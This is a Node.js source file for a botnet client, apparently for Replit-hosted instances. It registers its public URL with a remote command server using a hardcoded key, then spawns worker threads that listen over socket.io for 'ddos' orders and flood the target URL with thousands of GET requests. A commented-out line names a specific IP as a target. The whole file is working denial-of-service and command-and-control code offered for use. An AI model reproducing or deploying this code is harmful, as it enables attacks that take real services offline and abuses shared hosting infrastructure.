const {
  Worker,
  isMainThread
} = require("worker_threads");

const crypto = require("crypto")
const randomUA = require("random-fake-useragent");


const c = c => `\x1b[${c}m`
c.orange = c(33)
c.reset = c(0)
c.red = c(31)
c.green = c(32)

if (isMainThread) {
  for (i = 0; i < 5; i++) {
    new Worker(__filename);
  }
  const axios = require("axios")
  const express = require("express");
	const app = express();
  const fs = require('fs')
  fs.writeFileSync('./.replit','language = "nodejs"\nrun = "node index.js"')
	app.get("/", (req, res) => {
    console.log(c.green + "[SUCCESS]: " + c.reset + "GOT PINGED BY MAIN SERVER")
		res.end(".");
	});
	app.listen(80, () => {
		axios.post("https://Server.whatthrefuck.repl.co/_api/v1/addclient",{
      "key": "3hj82klahn2sx384",
      "url": "https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co"
    })
    .then(()=>{
      console.log(c.green + "[SUCCESS]: " + c.reset + "ADDED URL TO DB")
    })
    .catch(()=>{
      console.log(c.red + '[ERROR]: ' + c.reset + 'ERROR ADDING URL TO DB')
    })
	});
}else{
  var running,stop = false
  const workerID = crypto.randomBytes(8).toString("hex")
  const axios = require("axios");
  const io = require('socket.io-client')
  function sleep(ms) {
    return new Promise((res,rej)=>{setTimeout(res,ms)})
  }
  async function ddos(url,power) {
    if (stop) {
      stop = false;
      console.log('stopping attack - thread id: '+workerID)
      return
    }
    if (power >= 100) {
      var times = 200
    }
    if (power >= 400) {
      var times = 400
    }
    if (power >= 500) {
      var times = 600
    }
    if (power >= 600) {
      var times = 1000
    }
    for (let i=0;i<times;i++) {
    for (let i=0;i<power*5;i++) {
      console.log(c.green+'Requesting'+c.reset)
      axios
				.request({
					url,
					method: 'GET'
				})      
        .then(()=>{
        console.log(c.green+'Requested'+c.reset)
        })
        .catch(()=>{
          console.log(c.red+'Error requesting'+c.reset)
        })
      await sleep(3)
    }
    await sleep(1)
    }
    ddos(url,power)
  }
  //ddos('http://46.166.142.81/',1000)
  const socket = new io('wss://server.whatthrefuck.repl.co', {
		reconnection: true,
		reconnectionAttempts: 10000,
		reconnectionDelay: 6000,
		reconnectionDelayMax: 100000
	})
  socket.on('ddos',async(m)=>{
    if (running) {
      return
    }
    if (m.split('[*]x[*]')[0]) {
      running = true
      var url = m.split('[*]x[*]')[0];
      var power = 620; // static power for now // parseInt(m.split('[*]x[*]')[1]) || 620
      ddos(url,power)
      setTimeout(()=>{
        stop = true
        running = false
      },15000)
    };
  })
  socket.on('stop',()=>{
    running = false;
    stop = true;
    console.log(c.red + "[STOP]: " + c.reset + "STOPPING ATTACK")
  })
  console.log(c.orange + "[STATUS]: " + c.reset + "CREATED WORKER, ID: "+workerID)
}